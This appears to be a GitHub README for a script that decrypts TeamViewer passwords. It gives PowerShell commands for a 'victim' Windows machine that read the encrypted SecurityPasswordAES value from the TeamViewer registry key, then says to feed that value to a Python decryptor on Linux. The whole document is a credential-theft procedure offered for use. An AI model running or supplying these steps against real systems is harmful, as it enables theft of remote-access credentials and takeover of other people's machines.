# Decrypt TeamViewer Password
Python Script to Decrypt TeamViewer Password

**Usage**

**Victim Windows Shell:**

cd HKLM:\Software\WOW6432node\TeamViewer

dir

![image](https://user-images.githubusercontent.com/79543461/194757308-07bcca3d-e7db-46bd-86e9-46c84aaf36c8.png)

In this case Version 7:

cd Version7

(Get-ItemProperty .).SecurityPasswordAES

![image](https://user-images.githubusercontent.com/79543461/194756949-63693207-9720-4704-b8d1-b3a0d41248e8.png)

Copy all output and go to Linux Shell:

![image](https://user-images.githubusercontent.com/79543461/194757217-143c7fcd-4189-43bb-a207-7651afb75365.png)

Edit password.py file and put the output in "ADD HERE" part

![image](https://user-images.githubusercontent.com/79543461/194757282-53a1844c-f430-45de-ba85-13f852647b89.png)

python3 password.py

![image](https://user-images.githubusercontent.com/79543461/194757359-f1d720e8-9c98-4901-88c3-2b51c010d7ed.png)
